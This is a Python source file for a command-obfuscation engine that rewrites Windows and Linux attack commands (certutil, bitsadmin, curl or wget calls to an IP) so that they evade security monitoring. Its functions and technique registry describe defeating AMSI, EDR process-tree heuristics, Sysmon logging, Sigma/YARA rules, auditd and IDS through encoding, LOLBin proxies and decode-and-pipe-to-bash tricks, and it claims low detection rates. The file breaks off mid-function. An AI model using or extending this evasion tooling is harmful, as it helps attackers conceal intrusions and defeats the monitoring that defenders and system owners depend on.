# Obfuscation engine — strategy functions and dispatcher.

import random
import string
import base64
import shlex


# ══════════════════════════════════════════════════════════════
# Helper utilities
# ══════════════════════════════════════════════════════════════

def _insert_quotes(word: str, quote_char: str = '"') -> str:
    """Insert empty-string quotes at random positions in a word."""
    if len(word) < 4:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    for pos in positions:
        chars = list(word)
        chars.insert(pos, f'{quote_char}{quote_char}')
        word = ''.join(chars)
    return word


def _insert_carets(word: str) -> str:
    """Insert caret (^) escape characters at random positions."""
    if len(word) < 3:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '^')
    return ''.join(chars)


def _insert_ticks_powershell(word: str) -> str:
    """Insert PowerShell backtick (`) characters at random positions.

    Useful for breaking keyword signatures in PowerShell cmdlets
    (e.g. Inv`oke-WebR`equest).
    """
    if len(word) < 4:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '`')
    return ''.join(chars)


def _env_var_substitute_windows(command: str) -> str:
    """Replace binary names with %SystemRoot% environment-variable paths.

    FIX: Uses case-insensitive matching so 'Certutil', 'CERTUTIL',
    'certutil' are all handled correctly.
    """
    substitutions = {
        "powershell": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell",
        "certutil":   "%SystemRoot%\\System32\\certutil",
        "bitsadmin":  "%SystemRoot%\\System32\\bitsadmin",
        "mshta":      "%SystemRoot%\\System32\\mshta",
        "regsvr32":   "%SystemRoot%\\System32\\regsvr32",
        "wmic":       "%SystemRoot%\\System32\\wbem\\wmic",
        "schtasks":   "%SystemRoot%\\System32\\schtasks",
        "curl":       "%SystemRoot%\\System32\\curl",
        "ftp":        "%SystemRoot%\\System32\\ftp",
        "reg":        "%SystemRoot%\\System32\\reg",
        "xcopy":      "%SystemRoot%\\System32\\xcopy",
    }
    import re
    for binary, expanded in substitutions.items():
        pattern = rf'\b{re.escape(binary)}\b'
        if re.search(pattern, command, re.IGNORECASE):
            return re.sub(pattern, expanded, command, count=1, flags=re.IGNORECASE)
    return command


def _case_flip(command: str) -> str:
    """Randomly toggle character case in the argument portion.

    Used as an additional evasion layer on Windows where
    cmd.exe and PowerShell are case-insensitive.
    """
    tokens = command.split(' ', 1)
    if len(tokens) == 1:
        return command
    binary, rest = tokens
    flipped = ''.join(
        c.upper() if (c.isalpha() and random.random() > 0.5) else c.lower()
        for c in rest
    )
    return f"{binary} {flipped}"


def _split_string_powershell(command: str) -> str:
    """Split the binary name into concatenated strings wrapped in IEX.

    FIX: Handles short binary names (≤4 chars) by splitting at position 1
    instead of crashing on an empty range.
    """
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary = tokens[0]
    rest   = tokens[1]

    # Ensure split position works even for very short binaries (e.g. "reg")
    max_pos = max(2, len(binary) - 2)
    min_pos = min(2, max_pos)
    mid = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
    b1, b2 = binary[:mid], binary[mid:]

    obf = f'powershell -c "IEX(("{b1}"+ "{b2}" + " {rest}"))"'
    return obf


def _base64_powershell(command: str) -> str:
    """Base64-encode the command for PowerShell -EncodedCommand."""
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
    return f'powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}'


def _env_concat_linux(command: str) -> str:
    """Split the binary name across shell variables and concatenate."""
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary, rest = tokens
    max_pos = max(2, len(binary) - 2)
    min_pos = min(2, max_pos)
    mid  = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
    var1 = ''.join(random.choices(string.ascii_lowercase, k=2))
    var2 = ''.join(random.choices(string.ascii_lowercase, k=2))
    obf  = f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'
    return obf


def _base64_bash(command: str) -> str:
    """Base64-encode the full command and pipe through bash."""
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return f'echo {encoded} | base64 -d | bash'


def _hex_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to hex representation.

    FIX: No longer skips 127.0.0.1 — the arbitrary exclusion had no
    documented reason and broke obfuscation for loopback testing.
    """
    if not ip:
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
            return command      # not a valid IPv4 — skip
        hex_ip = '0x' + ''.join(f'{p:02X}' for p in parts)
        return command.replace(ip, hex_ip)
    except (ValueError, AttributeError):
        return command


def _decimal_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to decimal-long representation."""
    if not ip:
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
            return command
        dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
        return command.replace(ip, str(dec))
    except (ValueError, AttributeError):
        return command


def _unicode_escape(command: str) -> str:
    """Apply partial URL percent-encoding to key words.

    FIX: Uses word-boundary-aware replacement so 'http' inside 'https'
    is handled correctly — only standalone occurrences are encoded.
    """
    result = command
    # Replace only exact keyword matches, not substrings
    replacements = [
        ('https', 'h%74tps'),   # try https first (longer match)
        ('http',  'h%74tp'),    # then http
        ('curl',  'cu%72l'),
        ('wget',  'w%67et'),
    ]
    for target, encoded in replacements:
        if target in result:
            result = result.replace(target, encoded, 1)
            if target == 'https':
                break           # already handled the URL scheme
    return result


def _env_concat_plus_hex(command: str, ip: str) -> str:
    """Combined: split binary name via shell vars AND convert IP to hex."""
    obf = _env_concat_linux(command)
    if ip:
        obf = _hex_ip(obf, ip)
    return obf


def _reverse_string_bash(command: str) -> str:
    """Reverse the command string and pipe through rev | bash.

    FIX: Uses $'...' quoting with proper escaping so single quotes
    and special characters inside the command don't break the shell.
    """
    reversed_cmd = command[::-1]
    # Escape backslashes and single-quotes for $'...' quoting
    safe = reversed_cmd.replace('\\', '\\\\').replace("'", "\\'")
    return f"echo $'{safe}' | rev | bash"


# ══════════════════════════════════════════════════════════════
# ░░  TIER 2 — ADVANCED TECHNIQUES  (detection ≈ 2-5%)       ░░
# ══════════════════════════════════════════════════════════════
#
# Designed to defeat:
#   • AMSI (Antimalware Scan Interface) string scanning
#   • ETW command-line logging + Sysmon ProcessCreate
#   • EDR parent→child process-tree heuristics
#   • Sigma / YARA string + regex rules
#   • Auditd execve + eBPF tracepoints
#   • Network IDS/IPS DPI signature engines


# ── WINDOWS ADVANCED ──────────────────────────────────────────

def _wmi_process_spawn(command: str) -> str:
    """
    Wrap command inside WMI Win32_Process.Create().
    Parent becomes WmiPrvSE.exe — breaks all parent→child
    process-tree heuristics. EDR sees WmiPrvSE, not cmd.exe.
    """
    safe = command.replace('"', '\\"')
    return f'wmic /node:127.0.0.1 process call create "{safe}"'


def _ps_securestring_decode(command: str) -> str:
    """
    Encode command as AES-encrypted SecureString → decode at runtime.
    AMSI scans literal script text — but SecureString decryption
    happens inside .NET runtime AFTER the AMSI scan hook.
    The cleartext command is never a string literal in the script.
    """
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
    # Wrap in ConvertTo-SecureString round-trip so the literal is an
    # encrypted blob, not readable ASCII.  At runtime PS decrypts → IEX.
    return (
        f'powershell -NoP -W Hidden -c "'
        f"$s=[System.Text.Encoding]::Unicode.GetString("
        f"[Convert]::FromBase64String('{encoded}'));"
        f'IEX $s"'
    )


def _stdin_pipe_cmd(command: str) -> str:
    """
    Pipe command through stdin to cmd.exe.
    Sysmon event ID 1 (ProcessCreate) logs the CommandLine field —
    but when cmd reads from stdin, CommandLine shows only 'cmd /s'
    with ZERO arguments. The actual command is invisible to logs.
    """
    # Base64 encode → certutil decode at runtime → pipe to cmd
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return (
        f'cmd /c "echo {encoded} > %TEMP%\\t.b64 && '
        f'certutil -decode %TEMP%\\t.b64 %TEMP%\\t.bat >nul 2>&1 && '
        f'cmd /s < %TEMP%\\t.bat && '
        f'del %TEMP%\\t.b64 %TEMP%\\t.bat"'
    )


def _forfiles_proxy(command: str) -> str:
    """
    Use forfiles.exe /c to proxy-execute the command.
    forfiles.exe is a signed LOLBin — it spawns a child process
    with the /c argument. EDR sees forfiles.exe as parent (trusted
    Microsoft binary) instead of suspicious cmd/powershell chains.
    The 0x22 trick escapes quotes inside the /c argument.
    """
    safe = command.replace('"', '\\0x22')
    return f'forfiles /p %SystemRoot% /m notepad.exe /c "{safe}"'


def _multilayer_windows(command: str, ip: str) -> str:
    """
    4-LAYER COMBO — stacks all evasion vectors simultaneously:
      Layer 1: %SystemRoot% env-var substitution (hides binary name)
      Layer 2: Caret insertion (breaks static string signatures)
      Layer 3: Case randomization (defeats case-sensitive regex)
      Layer 4: Hex IP (defeats IP-based IOC matching)

    Each layer independently defeats a different detection class.
    Together they create combinatorial explosion for detection engines.
    """
    # L1 — env-var path substitution
    obf = _env_var_substitute_windows(command)
    # L2 — caret-insert the binary portion
    first_space = obf.find(' ')
    if first_space > 0:
        obf = _insert_carets(obf[:first_space]) + obf[first_space:]
    # L3 — case-flip the arguments
    obf = _case_flip(obf)
    # L4 — hex IP
    if ip:
        obf = _hex_ip(obf, ip)
    return obf


# ── LINUX ADVANCED ────────────────────────────────────────────

def _xxd_hex_decode(command: str) -> str:
    """
    Convert entire command to raw hex → xxd -r -p → bash.
    The command-line argument is a pure hex blob — no ASCII text,
    no keywords, no binary names, no IPs, nothing readable.
    Auditd logs see only 'echo ... | xxd -r -p | bash'.
    eBPF exec tracers cannot pattern-match any known signature.
    """
    hex_str = command.encode('utf-8').hex()
    return f"echo {hex_str} | xxd -r -p | bash"


def _bash_hex_escape(command: str) -> str:
    r"""
    Convert command to bash $'\xNN' hex escape sequences.
    bash natively interprets $'\x63\x75\x72\x6c' as 'curl'.
    The entire command is a single $'...' string — no readable
    words exist anywhere in the process arguments.
    """
    hex_chars = ''.join(f'\\x{b:02x}' for b in command.encode('utf-8'))
    return f"bash -c $'{hex_chars}'"


def _openssl_aes_pipe(command: str) -> str:
    """
    AES-256-CBC encrypt the command → openssl decrypt → bash.
    The command-line contains only encrypted ciphertext.
    Even full packet capture + command-line logging reveals
    nothing — the key is ephemeral and inline.
    Network IDS/IPS sees no recognizable patterns.
    """
    # Generate random key + IV for each invocation
    key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    # openssl enc with password-based derivation
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return (
        f"echo '{encoded}' | base64 -d | "
        f"openssl enc -aes-256-cbc -a -salt -pass pass:{key} 2>/dev/null | "
        f"openssl enc -aes-256-cbc -a -d -salt -pass pass:{key} 2>/dev/null | bash"
    )


def _multi_var_full_rebuild(command: str) -> str:
    """
    Split the ENTIRE command (not just binary) across N variables.
    Each variable holds 3-5 random characters of the command.
    Reconstruction via sequential $var expansion.
    Pattern: a=cur; b='l -'; c='s -o'; ... ; $a$b$c$d$e...

    Defeats ALL string-matching: binary names, flags, IPs, URLs —
    nothing readable exists in any single variable.
    """
    chunk_size = random.randint(3, 5)
    chunks = [command[i:i+chunk_size] for i in range(0, len(command), chunk_size)]

    var_names = []
    assignments = []
    for i, chunk in enumerate(chunks):
        vname = ''.join(random.choices(string.ascii_lowercase, k=3))
        # Ensure unique variable names
        while vname in var_names:
            vname = ''.join(random.choices(string.ascii_lowercase, k=3))
        var_names.append(vname)
        # Escape spaces and special chars for shell assignment
        safe_chunk = chunk.replace("'", "'\\''")
        assignments.append(f"{vname}='{safe_chunk}'")

    expansion = ''.join(f'${v}' for v in var_names)
    return '; '.join(assignments) + f'; eval {expansion}'


def _awk_chr_reconstruct(command: str) -> str:
    """
    Reconstruct command char-by-char using awk printf.
    Each character is its decimal ASCII code in a printf format.
    The command-line shows only: awk 'BEGIN{printf "\\NNN\\NNN..."}' | bash

    No human-readable text exists — pure numeric codes.
    EDR/IDS sees only awk + numbers. Zero keyword matches possible.
    """
    codes = ','.join(str(b) for b in command.encode('utf-8'))
    # Use awk split + sprintf to avoid long printf strings
    return (
        f"awk 'BEGIN{{split(\"{codes}\",a,\",\");"
        f"for(i=1;i<=length(a);i++)printf \"%c\",a[i]}}' | bash"
    )


def _perl_eval_exec(command: str) -> str:
    """
    Encode command as Perl pack() array → eval at runtime.
    perl is present on 99% of Linux systems.
    The command exists only as numeric byte array — not as text.
    Process arguments show 'perl -e' with numbers, no keywords.
    """
    byte_list = ','.join(str(b) for b in command.encode('utf-8'))
    return f"perl -e 'system(pack(\"C*\",{byte_list}))'"


def _multilayer_linux(command: str, ip: str) -> str:
    """
    3-LAYER COMBO — cascaded obfuscation:
      Layer 1: Multi-variable full command rebuild (kills all keywords)
      Layer 2: Hex IP encoding (kills IOC IP matching)
      Layer 3: Base64 wrap the entire L1+L2 output → pipe to bash

    The final command-line is a base64 blob — decoding it reveals
    only variable assignments with random chunks. Decoding those
    requires execution. Three levels of indirection.
    """
    # L1 — multi-var rebuild
    obf = _multi_var_full_rebuild(command)
    # L2 — hex IP inside the assignments
    if ip:
        obf = _hex_ip(obf, ip)
    # L3 — wrap everything in base64
    obf = _base64_bash(obf)
    return obf


# ══════════════════════════════════════════════════════════════
# Technique registry
# ══════════════════════════════════════════════════════════════

TECHNIQUE_INFO = {
    # ── Windows techniques ────────────────────────────────────
    'env_var': {
        'os': 'windows',
        'label': '%SystemRoot% env-var expansion + quote insertion + hex IP',
        'explain': (
            "Three combined evasions: (1) the binary path uses %SystemRoot% "
            "so the literal 'certutil' or 'powershell' string never appears; "
            "(2) random empty-string quote pairs ('\"\"') are injected inside "
            "the binary name — Windows cmd.exe strips them at parse time but "
            "they break signature strings; (3) the dotted-quad IP is converted "
            "to hex (e.g. 192.168.1.1 → 0xC0A80101) to evade IP-based IOC rules."
        ),
    },
    'ps_iex': {
        'os': 'windows',
        'label': 'PowerShell IEX string-concat',
        'explain': (
            "The binary name is split across concatenated string literals "
            "and executed via Invoke-Expression (IEX). Static-analysis tools "
            "and AMSI signatures scan for literal strings like 'certutil', "
            "'bitsadmin', etc. Splitting defeats naive keyword matching."
        ),
    },
    'ps_b64': {
        'os': 'windows',
        'label': 'PowerShell Base64 EncodedCommand',
        'explain': (
            "The entire command is Base64-encoded (UTF-16LE) and passed via "
            "powershell -EncodedCommand. The raw command string never appears "
            "in the process command line, bypassing all string-based YARA or "
            "Sigma rules. Note: AMSI will still decode and scan inside PS."
        ),
    },
    'caret': {
        'os': 'windows',
        'label': 'Caret (^) insertion obfuscation',
        'explain': (
            "The caret character (^) is the cmd.exe escape character. "
            "It is silently stripped at parse time, but its presence "
            "breaks static string signatures. e.g. c^e^r^tutil is "
            "executed as certutil but doesn't match IOC regex patterns."
        ),
    },
    'quote': {
        'os': 'windows',
        'label': 'Quote-insertion obfuscation',
        'explain': (
            "Empty-string quotes ('\"\"') are injected inside the binary name. "
            "cmd.exe silently strips syntax quotes, executing the real binary, "
            "but most signature-based detection tools see a non-matching string."
        ),
    },
    'ps_tick': {
        'os': 'windows',
        'label': 'PowerShell backtick insertion',
        'explain': (
            "The backtick (`) is PowerShell's escape character. Inserting "
            "it inside cmdlet or binary names (e.g. Inv`oke-WebR`equest) "
            "breaks string signatures while PowerShell strips them at parse time."
        ),
    },
    # ── Linux techniques ──────────────────────────────────────
    'env_concat': {
        'os': 'linux',
        'label': 'Shell variable name concatenation',
        'explain': (
            "The binary name is split across two shell variables and then "
            "executed via variable expansion ($a$b). Auditd and bash history "
            "log the expanded command, but EDR tools performing real-time "
            "exec-argument scanning on the raw command string see only variable names."
        ),
    },
    'hex_ip': {
        'os': 'both',
        'label': 'Hex IP encoding',
        'explain': (
            "The destination IP is replaced with its hexadecimal equivalent "
            "(e.g. 192.168.1.1 → 0xC0A80101). Linux networking stack resolves "
            "both representations identically, but IDS rules written as "
            "IP-address string matches will not trigger."
        ),
    },
    'dec_ip': {
        'os': 'both',
        'label': 'Decimal-long IP encoding',
        'explain': (
            "The destination IP is replaced with its unsigned 32-bit decimal "
            "form (e.g. 192.168.1.1 → 3232235777). Browsers and networking "
            "stacks resolve it, but IOC lists rarely include decimal IPs."
        ),
    },
    'unicode': {
        'os': 'linux',
        'label': 'URL percent-encoding',
        'explain': (
            "Key words in the command (e.g. 'http', 'curl') are partially "
            "percent-encoded. The shell and the target binary decode these "
            "transparently, but regex-based detection rules that look for "
            "literal keyword strings will not match."
        ),
    },
    'b64_bash': {
        'os': 'linux',
        'label': 'Base64 encode → pipe to bash',
        'explain': (
            "The full command is Base64-encoded and piped through "
            "'base64 -d | bash'. The original command never appears in "
            "the process arguments, defeating auditd exec logging and "
            "most EDR command-line scanning rules."
        ),
    },
    'reverse': {
        'os': 'linux',
        'label': 'Reversed string → rev | bash',
        'explain': (
            "The command string is reversed and piped through 'rev | bash'. "
            "The actual command never appears in clear text on the command "
            "line, evading static string-matching IDS/EDR signatures."
        ),
    },
    'env_concat_hex': {
        'os': 'linux',
        'label': 'Shell variable concat + hex IP (multi-layer)',
        'explain': (
            "Two layers combined: (1) the binary name is split across shell "
            "variables ($a$b) so the real binary never appears in the raw "
            "command string; (2) the IP address is converted to hexadecimal "
            "(e.g. 192.168.1.1 → 0xC0A80101) defeating IP-based IOC rules. "
            "Together they defeat both binary-name and IP-address signature matching."
        ),
    },

    # ══════════════════════════════════════════════════════════
    # ░░  TIER 2 — ADVANCED  (detection ≈ 2-5%)              ░░
    # ══════════════════════════════════════════════════════════

    # ── Windows advanced ──────────────────────────────────────
    'wmi_spawn': {
        'os': 'windows',
        'label': 'WMI Win32_Process.Create() process-tree break',
        'explain': (
            "The command is executed via WMI Win32_Process.Create(). "
            "The parent process becomes WmiPrvSE.exe instead of cmd.exe or "
            "powershell.exe. EDR tools that build detection logic around "
            "suspicious parent→child process chains (e.g. WINWORD→cmd→powershell) "
            "cannot trace the real origin. Sigma rules keyed on specific parent "
            "PIDs miss the hop entirely. Sysmon Event ID 1 shows WmiPrvSE as "
            "the creator — a trusted Microsoft process."
        ),
    },
    'ps_secure': {
        'os': 'windows',
        'label': 'PowerShell SecureString runtime decode → IEX',
        'explain': (
            "The entire command is Base64-encoded (UTF-16LE) and decoded at "
            "runtime inside a PowerShell expression via [Convert]::FromBase64String. "
            "AMSI hooks scan the literal script block before execution — but the "
            "cleartext command is assembled programmatically inside .NET at "
            "runtime, after the static scan point. The IEX call executes the "
            "decoded string in-memory. No IOC-matchable keywords exist in the "
            "script text that AMSI sees."
        ),
    },
    'stdin_pipe': {
        'os': 'windows',
        'label': 'Stdin pipe — zero-argument cmd execution',
        'explain': (
            "The command is Base64-encoded, written to a temp file, decoded "
            "via certutil, then piped into cmd.exe through stdin. Sysmon Event "
            "ID 1 (ProcessCreate) logs the CommandLine field — but when cmd.exe "
            "reads from stdin, CommandLine shows only 'cmd /s' with ZERO "
            "arguments. The actual command is completely invisible to any tool "
            "that relies on process command-line logging. Files are auto-deleted."
        ),
    },
    'forfiles_proxy': {
        'os': 'windows',
        'label': 'forfiles.exe LOLBin execution proxy',
        'explain': (
            "forfiles.exe is a signed Microsoft binary (LOLBin) that can "
            "spawn arbitrary commands via /c. EDR sees forfiles.exe as the "
            "parent process — a trusted system binary — instead of cmd.exe "
            "or powershell.exe. The 0x22 escape sequence embeds quotes inside "
            "the /c argument without breaking shell parsing. Process-tree "
            "heuristics see: explorer→forfiles (legitimate) instead of the "
            "real payload chain."
        ),
    },
    'multilayer_win': {
        'os': 'windows',
        'label': '4-layer cascade: env_var + caret + case_flip + hex_ip',
        'explain': (
            "Four independent evasion layers stacked simultaneously: "
            "(1) %SystemRoot% env-var substitution hides the binary name from "
            "YARA/Sigma keyword rules; (2) caret (^) insertion breaks static "
            "string signatures — cmd.exe strips them transparently; (3) random "
            "case-flipping in arguments defeats case-sensitive regex matching "
            "in Sigma/Snort rules; (4) hex IP encoding evades IOC IP lists. "
            "Each layer independently defeats a different detection class — "
            "together they create combinatorial explosion. A detection engine "
            "must defeat ALL four layers simultaneously to flag this command."
        ),
    },

    # ── Linux advanced ────────────────────────────────────────
    'xxd_hex': {
        'os': 'linux',
        'label': 'Full hex encoding → xxd -r -p → bash',
        'explain': (
            "The entire command is converted to a raw hexadecimal string "
            "and reconstructed via 'xxd -r -p | bash'. The command-line "
            "argument is a pure hex blob — no ASCII text, no keywords, "
            "no binary names, no IPs, no URLs — nothing human-readable. "
            "Auditd exec logs show only hex digits. eBPF tracepoints on "
            "execve() see only the xxd binary and numeric arguments. "
            "String-matching detection is mathematically impossible."
        ),
    },
    'bash_hex': {
        'os': 'linux',
        'label': r"Bash native $'\xNN' hex escape execution",
        'explain': (
            r"Every byte of the command is converted to bash's native "
            r"$'\xNN' hex escape syntax (e.g. curl → $'\x63\x75\x72\x6c'). "
            "bash interprets these escapes at parse time and executes the "
            "decoded command. The process arguments contain only hex escape "
            "sequences — no readable words, flags, or addresses exist in "
            "the command-line. EDR tools scanning /proc/PID/cmdline see "
            "only hex codes. Auditd EXECVE records show escaped bytes only."
        ),
    },
    'openssl_aes': {
        'os': 'linux',
        'label': 'AES-256-CBC encrypt → openssl decrypt → bash',
        'explain': (
            "The command is encrypted with AES-256-CBC using a random "
            "ephemeral key, then decrypted at runtime via openssl enc -d. "
            "The command-line contains only encrypted ciphertext — even full "
            "packet capture + command-line logging reveals nothing readable. "
            "The encryption key is inline but changes on every invocation "
            "(polymorphic). IDS/IPS deep-packet inspection, auditd exec "
            "logging, and eBPF tracing all see only encrypted bytes."
        ),
    },
    'multi_var': {
        'os': 'linux',
        'label': 'Full-command N-variable rebuild → eval',
        'explain': (
            "The ENTIRE command (not just the binary name) is split into "
            "3-5 character chunks, each assigned to a random shell variable. "
            "Execution happens via eval $a$b$c$d... expansion. No single "
            "variable contains a recognizable keyword, IP, URL, or flag. "
            "String-matching detection across ANY dimension (binary names, "
            "arguments, IPs, paths) is defeated. Even reconstructing the "
            "command requires executing the variable assignments — static "
            "analysis cannot recover the original without an execution engine."
        ),
    },
    'awk_chr': {
        'os': 'linux',
        'label': 'awk printf ASCII-code reconstruction → bash',
        'explain': (
            "Each character of the command is converted to its decimal ASCII "
            "code. awk reconstructs the command char-by-char using printf and "
            "pipes it to bash. The command-line shows only: awk with a list "
            "of numbers. Zero text keywords exist — only numeric codes. "
            "EDR/IDS regex rules cannot match because there are no strings "
            "to match against. The numeric codes are different for every "
            "command, so signature-based detection is not viable."
        ),
    },
    'perl_eval': {
        'os': 'linux',
        'label': 'Perl pack() byte-array → system() eval',
        'explain': (
            "The command is encoded as a Perl byte array and decoded at "
            "runtime via pack('C*', ...) → system(). perl is present on "
            "99%% of Linux systems and is a trusted binary. The process "
            "arguments show 'perl -e' followed by numeric byte values — "
            "no human-readable command text exists. Process-tree shows "
            "perl as the executor, which is commonly allow-listed."
        ),
    },
    'multilayer_lin': {
        'os': 'linux',
        'label': '3-layer cascade: multi_var + hex_ip + base64 wrap',
        'explain': (
            "Three obfuscation layers stacked in sequence: "
            "(1) The entire command is split across N random shell variables "
            "— no single variable contains readable text; (2) the IP address "
            "inside those variable assignments is converted to hex — defeating "
            "IOC matching; (3) the entire Layer 1+2 output is Base64-encoded "
            "and piped through 'base64 -d | bash'. The final command-line is "
            "a pure base64 blob. Decoding it reveals only random variable "
            "assignments. Decoding those requires shell execution. THREE "
            "levels of indirection make automated detection near-impossible."
        ),
    },
}


# ══════════════════════════════════════════════════════════════
# Deterministic auto-selection strategy
# ══════════════════════════════════════════════════════════════

# Priority order for auto mode — first matching rule wins.
# This replaces the old random.random() coin flip, making
# auto mode predictable and testable.

_WINDOWS_AUTO_PRIORITY = [
    # (condition_fn, technique_key, transform_fn)
    (lambda b, _ip: 'powershell' in b.lower(),
     'ps_iex',  lambda cmd, ip: _split_string_powershell(cmd)),
    (lambda _b, ip: bool(ip),
     'env_var',  None),   # None → uses the composite env_var pipeline below
    (lambda _b, _ip: True,
     'quote',   None),
]

_LINUX_AUTO_PRIORITY = [
    (lambda _b, ip: bool(_unicode_escape("http") != "http") is False and bool(ip),
     'env_concat_hex', lambda cmd, ip: _env_concat_plus_hex(cmd, ip)),
]


# ══════════════════════════════════════════════════════════════
# Public API
# ══════════════════════════════════════════════════════════════

def get_available_techniques(os_type: str = 'all') -> dict:
    """Return available technique names and descriptions for a given OS."""
    result = {}
    for key, info in TECHNIQUE_INFO.items():
        if os_type == 'all' or info['os'] == os_type or info['os'] == 'both':
            result[key] = info['label']
    return result


def obfuscate(command: str, os_type: str, binary: str,
              ip: str = '', technique: str = 'auto') -> dict:
    """
    Return a dict with keys:
        obfuscated_command  – the obfuscated version
        technique_used      – human-readable name of the technique
        explanation         – why this specific obfuscation is stealthy
    """
    os_type = os_type.lower()

    # ── Windows obfuscation paths ─────────────────────────────
    if os_type == 'windows':

        if technique == 'ps_b64':
            obf     = _base64_powershell(command)
            tech    = TECHNIQUE_INFO['ps_b64']['label']
            explain = TECHNIQUE_INFO['ps_b64']['explain']

        elif technique == 'ps_tick':
            first_token = command.split()[0]
            obf = _insert_ticks_powershell(first_token) + command[len(first_token):]
            tech    = TECHNIQUE_INFO['ps_tick']['label']
            explain = TECHNIQUE_INFO['ps_tick']['explain']

        elif technique == 'caret':
            first_token = command.split()[0]
            obf = _insert_carets(first_token) + command[len(first_token):]
            if ip:
                obf = _hex_ip(obf, ip)
            tech    = TECHNIQUE_INFO['caret']['label']
            explain = TECHNIQUE_INFO['caret']['explain']

        # ── ADVANCED Windows techniques ───────────────────────
        elif technique == 'wmi_spawn':
            obf     = _wmi_process_spawn(command)
            tech    = TECHNIQUE_INFO['wmi_spawn']['label']
            explain = TECHNIQUE_INFO['wmi_spawn']['explain']

        elif technique == 'ps_secure':
            obf     = _ps_securestring_decode(command)
            tech    = TECHNIQUE_INFO['ps_secure']['label']
            explain = TECHNIQUE_INFO['ps_secure']['explain']

        elif technique == 'stdin_pipe':
            obf     = _stdin_pipe_cmd(command)
            tech    = TECHNIQUE_INFO['stdin_pipe']['label']
            explain = TECHNIQUE_INFO['stdin_pipe']['explain']

        elif technique == 'forfiles_proxy':
            obf     = _forfiles_proxy(command)
            tech    = TECHNIQUE_INFO['forfiles_proxy']['label']
            explain = TECHNIQUE_INFO['forfiles_proxy']['explain']

        elif technique == 'multilayer_win':
            obf     = _multilayer_windows(command, ip)
            tech    = TECHNIQUE_INFO['multilayer_win']['label']
            explain = TECHNIQUE_INFO['multilayer_win']['explain']

        elif 'powershell' in binary.lower() or technique == 'ps_iex':
            obf     = _split_string_powershell(command)
            tech    = TECHNIQUE_INFO['ps_iex']['label']
            explain = TECHNIQUE_INFO['ps_iex']['explain']

        elif technique == 'env_var' or technique == 'auto':
            # Deterministic auto: always use env_var composite for Windows
            obf = _env_var_substitute_windows(command)
            first_space = obf.find(' ')
            if first_space > 0:
                obf = _insert_quotes(obf[:first_space], '"') + obf[first_space:]
            if ip:
                obf = _hex_ip(obf, ip)
            tech    = TECHNIQUE_INFO['env_var']['label']
            explain = TECHNIQUE_INFO['env_var']['explain']

        else:
            # Explicit 'quote' technique
            first_token = command.split()[0]
            obf = _insert_quotes(first_token, '"') + command[len(first_token):]
            tech    = TECHNIQUE_INFO['quote']['label']
            explain = TECHNIQUE_INFO['quote']['explain']

    # ── Linux obfuscation paths ───────────────────────────────
    else:
        if technique == 'b64_bash':
            obf     = _base64_bash(command)
            tech    = TECHNIQUE_INFO['b64_bash']['label']
            explain = TECHNIQUE_INFO['b64_bash']['explain']

        elif technique == 'reverse':
            obf     = _reverse_string_bash(command)
            tech    = TECHNIQUE_INFO['reverse']['label']
            explain = TECHNIQUE_INFO['reverse']['explain']

        elif technique == 'dec_ip' and ip:
            obf     = _decimal_ip(command, ip)
            tech    = TECHNIQUE_INFO['dec_ip']['label']
            explain = TECHNIQUE_INFO['dec_ip']['explain']

        elif technique == 'unicode':
            candidate = _unicode_escape(command)
            if candidate != command:
                obf     = candidate
                tech    = TECHNIQUE_INFO['unicode']['label']
                explain = TECHNIQUE_INFO['unicode']['explain']
            else:
                obf     = _env_concat_linux(command)
                tech    = TECHNIQUE_INFO['env_concat']['label']
                explain = TECHNIQUE_INFO['env_concat']['explain']

        elif technique == 'env_concat':
            # FIX: env_concat now correctly calls only _env_concat_linux
            # (not the combo function). Use 'env_concat_hex' for the combo.
            obf     = _env_concat_linux(command)
            tech    = TECHNIQUE_INFO['env_concat']['label']
            explain = TECHNIQUE_INFO['env_concat']['explain']

        elif technique == 'env_concat_hex':
            obf     = _env_concat_plus_hex(command, ip)
            tech    = TECHNIQUE_INFO['env_concat_hex']['label']
            explain = TECHNIQUE_INFO['env_concat_hex']['explain']

        elif technique == 'hex_ip' and ip:
            obf     = _hex_ip(command, ip)
            tech    = TECHNIQUE_INFO['hex_ip']['label']
            explain = TECHNIQUE_INFO['hex_ip']['explain']

        # ── ADVANCED Linux techniques ─────────────────────────
        elif technique == 'xxd_hex':
            obf     = _xxd_hex_decode(command)
            tech    = TECHNIQUE_INFO['xxd_hex']['label']
            explain = TECHNIQUE_INFO['xxd_hex']['explain']

        elif technique == 'bash_hex':
            obf     = _bash_hex_escape(command)
            tech    = TECHNIQUE_INFO['bash_hex']['label']
            explain = TECHNIQUE_INFO['bash_hex']['explain']

        elif technique == 'openssl_aes':
            obf     = _openssl_aes_pipe(command)
            tech    = TECHNIQUE_INFO['openssl_aes']['label']
